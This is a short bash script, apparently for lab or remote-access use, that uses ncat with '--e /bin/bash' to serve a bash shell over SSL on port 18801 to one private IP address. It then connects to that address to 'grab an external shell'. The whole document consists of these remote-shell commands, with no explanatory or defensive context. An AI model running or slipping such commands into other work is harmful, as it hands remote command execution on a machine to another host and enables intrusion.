#!/bin/bash
echo "Opening connection on 18801"
ncat --e /bin/bash --allow 192.168.19.185 -vnl 18801 --ssl

# grab an external shell
echo "Connecting to... 18801"
ncat -v 192.168.19.185 18801 --ssl
